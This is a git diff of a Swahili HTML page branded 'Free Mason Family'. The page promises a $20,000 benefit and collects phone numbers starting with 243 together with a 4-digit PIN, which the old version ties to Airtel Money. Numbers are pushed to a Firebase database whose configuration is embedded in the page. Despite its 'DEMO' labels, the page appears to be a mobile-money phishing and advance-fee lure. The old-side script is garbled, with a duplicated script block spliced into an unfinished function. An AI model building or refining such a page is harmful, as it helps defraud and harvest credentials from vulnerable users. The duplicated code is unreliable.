@@ -1,365 +1,352 @@
 <!DOCTYPE html>
 <html lang="sw">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Free Mason Family Fraternity Society — Demo</title>
+    <meta charset="UTF-8">
 
-<style>
-*{
-    box-sizing:border-box;
-    margin:0;
-    padding:0;
-    font-family:Arial,Helvetica,sans-serif;
-}
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0">
 
-body{
-    background:#f7f8fa;
-    color:#222;
-}
+    <title>Free Mason Family — Demo</title>
 
-.header{
-    background:#d90000;
-    color:white;
-    padding:18px 7%;
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-}
+    <style>
 
-.logo{
-    font-size:21px;
-    font-weight:800;
-}
+        * {
+            box-sizing: border-box;
+        }
 
-.demo-badge{
-    background:#fff;
-    color:#d90000;
-    padding:7px 12px;
-    border-radius:20px;
-    font-size:12px;
-    font-weight:bold;
-}
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #e60000;
+            color: #222;
+        }
 
-.status{
-    background:#222;
-    color:white;
-    padding:9px;
-    text-align:center;
-    font-size:13px;
-}
+        .header {
+            background: #e60000;
+            color: white;
+            padding: 18px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
 
-.status-dot{
-    display:inline-block;
-    width:8px;
-    height:8px;
-    border-radius:50%;
-    background:#999;
-    margin-right:6px;
-}
+        .logo {
+            font-size: 22px;
+            font-weight: 800;
+        }
 
-.status-dot.online{
-    background:#20c66b;
-}
+        .demo-badge {
+            background: white;
+            color: #e60000;
+            padding: 7px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+        }
 
-.hero{
-    min-height:calc(100vh - 100px);
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    padding:45px 20px;
-    background:
-        linear-gradient(135deg,#d90000,#a80000);
-}
+        .status {
+            background: #202020;
+            color: white;
+            text-align: center;
+            padding: 11px;
+            font-size: 14px;
+        }
 
-.card{
-    width:100%;
-    max-width:460px;
-    background:white;
-    border-radius:22px;
-    padding:35px;
-    box-shadow:0 20px 60px rgba(0,0,0,.25);
-}
+        .status-dot {
+            display: inline-block;
+            width: 11px;
+            height: 11px;
+            border-radius: 50%;
+            background: #777;
+            margin-right: 7px;
+        }
 
-.symbol{
-    width:65px;
-    height:65px;
-    border-radius:50%;
-    background:#d90000;
-    color:white;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    margin:0 auto 20px;
-    font-size:27px;
-    font-weight:bold;
-}
+        .status-dot.online {
+            background: #20c878;
+        }
 
-h1{
-    text-align:center;
-    font-size:27px;
-    line-height:1.25;
-    margin-bottom:12px;
-}
+        .hero {
+            text-align: center;
+            color: white;
+            padding: 35px 20px 25px;
+        }
 
-.subtitle{
-    text-align:center;
-    color:#666;
-    line-height:1.6;
-    margin-bottom:25px;
-}
+        .hero h1 {
+            margin: 0 0 12px;
+            font-size: 32px;
+        }
 
-.benefit{
-    background:#fff4f4;
-    border:1px solid #ffd0d0;
-    border-radius:15px;
-    padding:18px;
-    text-align:center;
-    margin-bottom:25px;
-}
+        .hero p {
+            margin: 0 auto;
+            max-width: 650px;
+            line-height: 1.6;
+            font-size: 16px;
+        }
 
-.benefit strong{
-    display:block;
-    color:#d90000;
-    font-size:30px;
-    margin-top:5px;
-}
+        .container {
+            max-width: 520px;
+            margin: 0 auto;
+            padding: 10px 18px 40px;
+        }
 
-label{
-    display:block;
-    font-weight:bold;
-    margin-bottom:8px;
-}
+        .card {
+            background: white;
+            border-radius: 25px;
+            padding: 28px 22px;
+            box-shadow: 0 10px 35px rgba(0,0,0,0.18);
+        }
 
-.input-group{
-    margin-bottom:18px;
-}
+        .card h2 {
+            text-align: center;
+            margin-top: 0;
+            font-size: 25px;
+        }
 
-input{
-    width:100%;
-    padding:15px;
-    border:1px solid #ddd;
-    border-radius:12px;
-    font-size:17px;
-    outline:none;
-}
+        .notice {
+            background: #fff7d9;
+            border: 1px solid #ead77a;
+            border-radius: 14px;
+            padding: 15px;
+            margin-bottom: 22px;
+            color: #6d5b12;
+            line-height: 1.5;
+            font-size: 14px;
+        }
 
-input:focus{
-    border-color:#d90000;
-    box-shadow:0 0 0 3px rgba(217,0,0,.08);
-}
+        .notice strong {
+            display: block;
+            margin-bottom: 7px;
+        }
 
-.pin{
-    letter-spacing:8px;
-    text-align:center;
-    font-size:22px;
-}
+        label {
+            display: block;
+            font-weight: bold;
+            margin: 16px 0 7px;
+        }
 
-.demo-note{
-    background:#fff8df;
-    border:1px solid #f1d46a;
-    color:#765d00;
-    padding:12px;
-    border-radius:10px;
-    font-size:12px;
-    line-height:1.5;
-    margin-bottom:18px;
-}
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ccc;
+            border-radius: 12px;
+            font-size: 17px;
+            outline: none;
+        }
 
-button{
-    width:100%;
-    border:0;
-    background:#d90000;
-    color:white;
-    padding:16px;
-    border-radius:12px;
-    font-size:17px;
-    font-weight:bold;
-    cursor:pointer;
-}
+        input:focus {
+            border-color: #e60000;
+        }
 
-button:hover{
-    background:#b90000;
-}
+        .pin-note {
+            font-size: 12px;
+            color: #777;
+            margin-top: 7px;
+        }
 
-button:disabled{
-    opacity:.6;
-    cursor:not-allowed;
-}
+        button {
+            width: 100%;
+            border: none;
+            background: #e60000;
+            color: white;
+            padding: 16px;
+            border-radius: 13px;
+            font-size: 17px;
+            font-weight: bold;
+            margin-top: 24px;
+            cursor: pointer;
+        }
 
-.message{
-    margin-top:15px;
-    text-align:center;
-    font-size:14px;
-    min-height:20px;
-}
+        button:disabled {
+            opacity: 0.65;
+            cursor: wait;
+        }
 
-.footer{
-    text-align:center;
-    color:#777;
-    font-size:12px;
-    padding:20px;
-    background:white;
-}
+        .message {
+            text-align: center;
+            min-height: 22px;
+            margin-top: 15px;
+            font-weight: bold;
+            line-height: 1.5;
+        }
 
-.hidden{
-    display:none;
-}
+        .footer {
+            color: white;
+            text-align: center;
+            padding: 0 20px 35px;
+            font-size: 12px;
+            line-height: 1.5;
+        }
 
-.success-icon{
-    width:75px;
-    height:75px;
-    background:#20a464;
-    color:white;
-    border-radius:50%;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    margin:0 auto 20px;
-    font-size:38px;
-}
+    </style>
 
-.success-title{
-    text-align:center;
-    color:#222;
-}
+</head>
 
-.success-text{
-    text-align:center;
-    line-height:1.7;
-    color:#666;
-    margin:18px 0;
-}
+<body>
 
-.reference{
-    background:#f5f5f5;
-    padding:14px;
-    border-radius:10px;
-    text-align:center;
-    font-size:13px;
-}
-</style>
-</head><body>
+
+<!-- =========================
+     SECTION 1 — HEADER
+========================= -->
 
 <header class="header">
-    <div class="logo">Free Mason Family</div>
+
+    <div class="logo">
+        Free Mason Family
+    </div>
 
     <div class="demo-badge">
         DEMO
     </div>
+
 </header>
 
+
+<!-- =========================
+     SECTION 2 — FIREBASE STATUS
+========================= -->
+
 <div class="status">
-    <span id="statusDot" class="status-dot"></span>
-    <span id="statusText">Inaunganisha...</span>
+
+    <span
+        id="statusDot"
+        class="status-dot">
+    </span>
+
+    <span id="statusText">
+        Inaunganisha Firebase...
+    </span>
+
 </div>
 
-<main class="hero">
 
-    <section class="card" id="loginPage">
+<!-- =========================
+     SECTION 3 — HERO
+========================= -->
 
-        <div class="symbol">FM</div>
+<section class="hero">
 
-        <h1>
-            Karibu Free Mason Family Fraternity Organization Society
-        </h1>
+    <h1>
+        Free Mason Family
+    </h1>
 
-        <p class="subtitle">
-            Ingia kwenye akaunti yako ya demo ili kuendelea na mchakato wa
-            manufaa ya familia.
-        </p>
+    <p>
+        Mfumo wa majaribio wa huduma za familia
+        na jumuiya. Huu ni ukurasa wa DEMO
+        kwa ajili ya kuonyesha mtiririko wa mfumo.
+    </p>
 
-        <div class="benefit">
-            Kiasi cha manufaa ya demo
-            <strong>$20,000</strong>
+</section>
+
+
+<!-- =========================
+     SECTION 4 — FORM
+========================= -->
+
+<div class="container">
+
+    <div class="card">
+
+        <h2>
+            Ingia kwenye DEMO
+        </h2>
+
+
+        <div class="notice">
+
+            <strong>
+                TAARIFA MUHIMU YA DEMO
+            </strong>
+
+            Huu ni mfumo wa majaribio pekee.
+            Hakuna akaunti halisi ya malipo
+            inayounganishwa na ukurasa huu.
+
         </div>
 
-        <div class="demo-note">
-            <strong>TAARIFA YA DEMO:</strong><br>
-            Huu ni mfumo wa majaribio tu. Usiweke Airtel Money PIN yako halisi.
-            PIN inayotumika hapa ni PIN ya DEMO pekee.
-        </div>
 
         <form id="loginForm">
 
-            <div class="input-group">
-                <label for="phone">
-                    Namba ya simu
-                </label>
 
-                <input
-                    type="tel"
-                    id="phone"
-                    placeholder="243XXXXXXXXX"
-                    maxlength="15"
-                    required
-                >
+            <!-- PHONE -->
+
+            <label for="phone">
+                Namba ya simu
+            </label>
+
+            <input
+                id="phone"
+                type="tel"
+                inputmode="numeric"
+                placeholder="243XXXXXXXXX"
+                maxlength="15"
+                autocomplete="off"
+                required
+            >
+
+
+            <!-- DEMO PIN -->
+
+            <label for="demoPin">
+                PIN ya DEMO
+            </label>
+
+            <input
+                id="demoPin"
+                type="password"
+                inputmode="numeric"
+                placeholder="Ingiza tarakimu 4"
+                maxlength="4"
+                pattern="[0-9]{4}"
+                autocomplete="off"
+                required
+            >
+
+            <div class="pin-note">
+                PIN hii ni ya DEMO pekee na haitahifadhiwa.
             </div>
 
-            <div class="input-group">
-                <label for="demoPin">
-                    PIN ya DEMO ya tarakimu 4
-                </label>
 
-                <input
-                    type="password"
-                    id="demoPin"
-                    class="pin"
-                    placeholder="••••"
-                    inputmode="numeric"
-                    maxlength="4"
-                    pattern="[0-9]{4}"
-                    required
-                >
-            </div>
+            <!-- BUTTON -->
 
-            <button id="submitButton" type="submit">
+            <button
+                id="submitButton"
+                type="submit">
+
                 Endelea
+
             </button>
 
-            <div id="message" class="message"></div>
+
+            <!-- MESSAGE -->
+
+            <div
+                id="message"
+                class="message">
+            </div>
 
         </form>
 
-    </section>    <section class="card hidden" id="successPage">
+    </div>
 
-        <div class="success-icon">
-            ✓
-        </div>
+</div>
 
-        <h1 class="success-title">
-            Ombi Limewasilishwa
-        </h1>
 
-        <p class="success-text">
-            Umefanikiwa kuwasilisha ombi lako la <strong>DEMO $20,000</strong>
-            kwenye mfumo wa majaribio wa Free Mason Family Society.
-        </p>
+<!-- =========================
+     SECTION 5 — FOOTER
+========================= -->
 
-        <div class="reference">
-            <strong>Namba ya kumbukumbu ya DEMO</strong>
-            <br><br>
-            <span id="referenceNumber">---</span>
-        </div>
+<div class="footer">
 
-        <p class="success-text">
-            Huu ni ujumbe wa majaribio pekee. Hakuna fedha halisi
-            zilizotumwa au kutolewa.
-        </p>
+    DEMO SYSTEM — SI HUDUMA RASMI YA MALIPO.
 
-        <button onclick="location.reload()">
-            Rudi Mwanzo
-        </button>
+</div>
 
-    </section>
 
-</main>
+<!-- =========================
+     SECTION 6 — FIREBASE
+========================= -->
 
-<footer class="footer">
-    Free Mason Family Fraternity Organization Society
-    <br>
-    DEMO SYSTEM — SI HUDUMA RASMI YA AIRTEL
 <script type="module">
 
 import { initializeApp }
@@ -375,53 +362,90 @@ import {
 from "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";
 
 
+/* =========================
+   FIREBASE CONFIG
+========================= */
+
 const firebaseConfig = {
-    apiKey: "AIzaC3IylLRAMgF8Oo1oFCJk-FIkzRNS8j58U",
-    authDomain: "freemason-society.firebaseapp.com",
-    databaseURL: "https://freemason-society-default-rtdb.europe-west1.firebasedatabase.app",
-    projectId: "freemason-society",
-    storageBucket: "freemason-society.firebasestorage.app",
-    messagingSenderId: "515013260684",
-    appId: "1:515013260684:web:23f4fca3d739e7084ed2a9",
-    measurementId: "G-XDQ6GF6QV6"
+
+    apiKey:
+        "AIzaC3IylLRAMGf8Oo1oFCJk-FIkzRNS8j58U",
+
+    authDomain:
+        "freemason-society.firebaseapp.com",
+
+    databaseURL:
+        "https://freemason-society-default-rtdb.europe-west1.firebasedatabase.app",
+
+    projectId:
+        "freemason-society",
+
+    storageBucket:
+        "freemason-society.firebasestorage.app",
+
+    messagingSenderId:
+        "515013260684",
+
+    appId:
+        "1:515013260684:web:23f4fca3d739e7084ed2a9",
+
+    measurementId:
+        "G-XDQ6GF6QV6"
 };
 
 
-const app = initializeApp(firebaseConfig);
-const database = getDatabase(app);
+/* =========================
+   START FIREBASE
+========================= */
+
+const app =
+    initializeApp(firebaseConfig);
+
+const database =
+    getDatabase(app);
 
 
-/* FIREBASE CONNECTION STATUS */
+/* =========================
+   CONNECTION STATUS
+========================= */
 
 const connectionRef =
     ref(database, ".info/connected");
 
-onValue(connectionRef, (snapshot) => {
 
-    const dot =
-        document.getElementById("statusDot");
+onValue(
+    connectionRef,
+    (snapshot) => {
 
-    const text =
-        document.getElementById("statusText");
+        const dot =
+            document.getElementById("statusDot");
 
-    if (snapshot.val() === true) {
+        const text =
+            document.getElementById("statusText");
 
-        dot.classList.add("online");
 
-        text.textContent =
-            "Imeunganishwa • Firebase iko hai";
+        if (snapshot.val() === true) {
 
-    } else {
+            dot.classList.add("online");
 
-        dot.classList.remove("online");
+            text.textContent =
+                "Imeunganishwa • Firebase iko hai";
 
-        text.textContent =
-            "Muunganisho umekatika";
+        } else {
+
+            dot.classList.remove("online");
+
+            text.textContent =
+                "Muunganisho umekatika";
+        }
+
     }
-});
+);
 
 
-/* DEMO LOGIN */
+/* =========================
+   FORM ELEMENTS
+========================= */
 
 const form =
     document.getElementById("loginForm");
@@ -433,181 +457,65 @@ const button =
     document.getElementById("submitButton");
 
 
-form.addEventListener("submit", async (event) => {
-
-    event.preventDefault();
-
-
-    const phone =
-        document.getElementById("phone")
-        .value.trim();
-
-    const demoPin =
-        document.getElementById("demoPin")
-        .value.trim();
-
-
-    /* PHONE MUST BEGIN WITH 243 */
-
-    if (!/^243[0-9]{9,12}$/.test(phone)) {
-
-        message.textContent =
-            "Tafadhali weka namba inayoanza na 243.";
-
-        message.style.color = "#d90000";
-
-        return;
-    }
-
-
-    /* DEMO PIN = EXACTLY 4 DIGITS */
-
-    if (!/^[0-9]{4}$/.test(demoPin)) {
-
-        message.textContent =
-            "PIN ya DEMO lazima iwe na tarakimu 4.";
-
-        message.style.color = "#d90000";
-
-        return;
-    }
-
-
-    button.disabled = true;
-
-    button.textContent =
-        "Inawasilisha...";
-
-
-    try {
-
-        /*
-         * DEMO DATA ONLY.
-         *
-         * The PIN is deliberately NOT
-         * saved to Firebase.
-         */
-
-        const submissionsRef =
-            ref(
-                database,
-                "freeMasonDemo/submissions"
-<script type="module">
-
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
-
-import {
-    getDatabase,
-    ref,
-    onValue,
-    push,
-    set
-} from "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";
-
-
 /* =========================
-   SECTION 1 — FIREBASE
+   FORM SUBMISSION
 ========================= */
 
-const firebaseConfig = {
-    apiKey: "AIzaC3IylLRAMGf8Oo1oFCJk-FIkzRNS8j58U",
-    authDomain: "freemason-society.firebaseapp.com",
-    databaseURL: "https://freemason-society-default-rtdb.europe-west1.firebasedatabase.app",
-    projectId: "freemason-society",
-    storageBucket: "freemason-society.firebasestorage.app",
-    messagingSenderId: "515013260684",
-    appId: "1:515013260684:web:23f4fca3d739e7084ed2a9",
-    measurementId: "G-XDQ6GF6QV6"
-};
-
-const app = initializeApp(firebaseConfig);
-const database = getDatabase(app);
-
-
-/* =========================
-   SECTION 2 — CONNECTION
-========================= */
-
-const connectionRef = ref(database, ".info/connected");
-
-onValue(connectionRef, (snapshot) => {
-
-    const dot = document.getElementById("statusDot");
-    const text = document.getElementById("statusText");
-
-    if (!dot || !text) return;
-
-    if (snapshot.val() === true) {
-
-        dot.classList.add("online");
-
-        text.textContent =
-            "Imeunganishwa • Firebase iko hai";
-
-    } else {
-
-        dot.classList.remove("online");
-
-        text.textContent =
-            "Muunganisho umekatika";
-    }
-
-});
-
-
-/* =========================
-   SECTION 3 — FORM
-========================= */
-
-const form = document.getElementById("loginForm");
-const message = document.getElementById("message");
-const button = document.getElementById("submitButton");
-
-
-if (form) {
-
-    form.addEventListener("submit", async (event) => {
+form.addEventListener(
+    "submit",
+    async (event) => {
 
         event.preventDefault();
 
 
-        /* Get values */
-
         const phone =
-            document.getElementById("phone").value.trim();
+            document
+                .getElementById("phone")
+                .value
+                .trim();
+
 
         const demoPin =
-            document.getElementById("demoPin").value.trim();
+            document
+                .getElementById("demoPin")
+                .value
+                .trim();
 
 
         /* =========================
-           SECTION 4 — VALIDATION
+           PHONE CHECK
         ========================= */
 
         if (!/^243[0-9]{9,12}$/.test(phone)) {
 
             message.textContent =
-                "Tafadhali weka namba inayoanza na 243.";
+                "Tafadhali weka namba sahihi inayoanza na 243.";
 
-            message.style.color = "#d90000";
+            message.style.color =
+                "#d90000";
 
             return;
         }
 
+
+        /* =========================
+           DEMO PIN CHECK
+        ========================= */
 
         if (!/^[0-9]{4}$/.test(demoPin)) {
 
             message.textContent =
                 "PIN ya DEMO lazima iwe na tarakimu 4.";
 
-            message.style.color = "#d90000";
+            message.style.color =
+                "#d90000";
 
             return;
         }
 
 
         /* =========================
-           SECTION 5 — SUBMIT
+           LOADING
         ========================= */
 
         button.disabled = true;
@@ -615,39 +523,55 @@ if (form) {
         button.textContent =
             "Inawasilisha...";
 
+        message.textContent =
+            "";
+
 
         try {
 
+
+            /* =========================
+               SAVE DEMO DATA
+            ========================= */
+
             const submissionsRef =
-                ref(database, "freeMasonDemo/submissions");
+                ref(
+                    database,
+                    "freeMasonDemo/submissions"
+                );
+
 
             const newSubmission =
                 push(submissionsRef);
 
 
             /*
-              IMPORTANT:
-              Demo PIN is NOT saved.
-            */
+             * IMPORTANT:
+             * demoPin is intentionally
+             * NOT saved to Firebase.
+             */
 
-            await set(newSubmission, {
+            await set(
+                newSubmission,
+                {
 
-                phone: phone,
+                    phone: phone,
 
-                type: "DEMO",
+                    type: "DEMO",
 
-                amount: 20000,
+                    amount: 20000,
 
-                currency: "USD",
+                    currency: "USD",
 
-                createdAt:
-                    new Date().toISOString()
+                    createdAt:
+                        new Date().toISOString()
 
-            });
+                }
+            );
 
 
             /* =========================
-               SECTION 6 — REFERENCE
+               CREATE REFERENCE
             ========================= */
 
             const reference =
@@ -658,19 +582,15 @@ if (form) {
 
 
             /* =========================
-               SECTION 7 — NEXT PAGE
+               OPEN SUCCESS PAGE
             ========================= */
 
             window.location.href =
-                "success.html?ref=" +
+                "./success.html?ref=" +
                 encodeURIComponent(reference);
 
         }
 
-
-        /* =========================
-           SECTION 8 — ERROR
-        ========================= */
 
         catch (error) {
 
@@ -679,22 +599,25 @@ if (form) {
                 error
             );
 
+
             message.textContent =
-                "Kuna tatizo la Firebase. Tafadhali jaribu tena.";
+                "Firebase haikubali ombi. Hakuna data iliyopotea. Tafadhali jaribu tena.";
 
             message.style.color =
                 "#d90000";
 
+
             button.disabled =
                 false;
 
+
             button.textContent =
                 "Endelea";
+
         }
 
-    });
-
-}
+    }
+);
 
 </script>
 
